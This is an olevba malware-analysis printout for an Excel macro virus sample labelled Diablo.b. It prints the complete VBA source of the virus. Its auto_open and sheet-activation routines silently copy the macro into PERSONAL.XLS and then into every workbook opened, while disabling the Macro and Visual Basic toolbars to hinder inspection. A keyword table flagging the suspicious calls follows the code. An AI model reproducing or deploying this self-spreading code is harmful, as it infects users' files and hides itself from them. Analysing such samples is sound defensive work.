olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSExcel.Diablo.b-16226a89a11de841e6238f1aba5eb7748e288d25
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisWorkbook.cls 
in file: Virus.MSExcel.Diablo.b-16226a89a11de841e6238f1aba5eb7748e288d25 - OLE stream: '_VBA_PROJECT_CUR/VBA/ThisWorkbook'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Sheet1.cls 
in file: Virus.MSExcel.Diablo.b-16226a89a11de841e6238f1aba5eb7748e288d25 - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Sheet2.cls 
in file: Virus.MSExcel.Diablo.b-16226a89a11de841e6238f1aba5eb7748e288d25 - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet2'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Sheet3.cls 
in file: Virus.MSExcel.Diablo.b-16226a89a11de841e6238f1aba5eb7748e288d25 - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet3'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Sheet4.cls 
in file: Virus.MSExcel.Diablo.b-16226a89a11de841e6238f1aba5eb7748e288d25 - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet4'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Sheet5.cls 
in file: Virus.MSExcel.Diablo.b-16226a89a11de841e6238f1aba5eb7748e288d25 - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet5'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Sheet6.cls 
in file: Virus.MSExcel.Diablo.b-16226a89a11de841e6238f1aba5eb7748e288d25 - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet6'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO C342.bas 
in file: Virus.MSExcel.Diablo.b-16226a89a11de841e6238f1aba5eb7748e288d25 - OLE stream: '_VBA_PROJECT_CUR/VBA/C342'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Diablos Macro
' Bios Virus Macro - (C) Copyright 1999/2000

Public Macro As String

Sub auto_open()
Attribute auto_open.VB_ProcData.VB_Invoke_Func = " \n14"
    On Error GoTo ErrorHandler
    MkDir (Application.StartupPath)
    On Error GoTo 0
    GoTo ErrorHandler
ErrorHandler:
For i = 1 To ThisWorkbook.VBProject.VBComponents.Count
    Cadena = ThisWorkbook.VBProject.VBComponents(i).Name
    Letras = Left(Cadena, 1): Numero = Right(Cadena, 3)
    If Letras = "C" And Numeros <= "1000" Then
       Macro = ThisWorkbook.VBProject.VBComponents(i).Name
    End If
Next
Application.OnSheetActivate = "Modulo"
End Sub

Sub Modulo()
Attribute Modulo.VB_ProcData.VB_Invoke_Func = " \n14"
    Randomize
    Application.ScreenUpdating = False
    Application.DisplayAlerts = False
    Set Bar1 = CommandBars("Macro")
        Bar1.Enabled = False
    Set Bar2 = CommandBars("Visual Basic")
        Bar2.Enabled = False
    install = 0
    Intr = Int((Rnd * 1000) + 1)
    Play = ("C" & Intr)
    If ThisWorkbook.Name <> "PERSONAL.XLS" Then
       If Dir(Application.StartupPath + "\PERSONAL.XLS") = "PERSONAL.XLS" Then install = 1
       If install = 0 Then
          Workbooks.Add.SaveAs FileName:=Application.StartupPath + "\PERSONAL.XLS"
          ThisWorkbook.VBProject.VBComponents(Macro).Export (Macro)
          Workbooks("PERSONAL.XLS").VBProject.VBComponents.Import (Macro)
          Workbooks("PERSONAL.XLS").VBProject.VBComponents(Macro).Name = Play
          Workbooks("PERSONAL.XLS").Save
          Windows("PERSONAL.XLS").Visible = False
       End If
    Else
       Windows("PERSONAL.XLS").Visible = False
       For i = 1 To ActiveWorkbook.VBProject.VBComponents.Count
           Cadena = ActiveWorkbook.VBProject.VBComponents(i).Name
           Letras = Left(Cadena, 1): Numero = Right(Cadena, 3)
           If Letras = "C" And Numeros <= "1000" Then install = 1
       Next
       If install = 0 Then
          Workbooks("PERSONAL.XLS").VBProject.VBComponents(Macro).Export (Macro)
          ActiveWorkbook.VBProject.VBComponents.Import (Macro)
          ActiveWorkbook.VBProject.VBComponents(Macro).Name = Play
          Workbooks(ActiveWorkbook.Name).Save
          Windows("PERSONAL.XLS").Visible = False
       End If
    End If
    Workbooks("PERSONAL.XLS").Save
    Application.ScreenUpdating = True
    Application.DisplayAlerts = True
    If Day(Now()) = Int((31 * Rnd) + 1) Then CommandBars.LargeButtons = True
End Sub
-------------------------------------------------------------------------------
VBA MACRO xlm_macro.txt 
in file: xlm_macro - OLE stream: 'xlm_macro'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
' 0085     14 BOUNDSHEET : Sheet Information - 20, reserved bits not zero: 0x20 visible -        
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |auto_open           |Runs when the Excel Workbook is opened       |
|Suspicious|MkDir               |May create a directory                       |
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

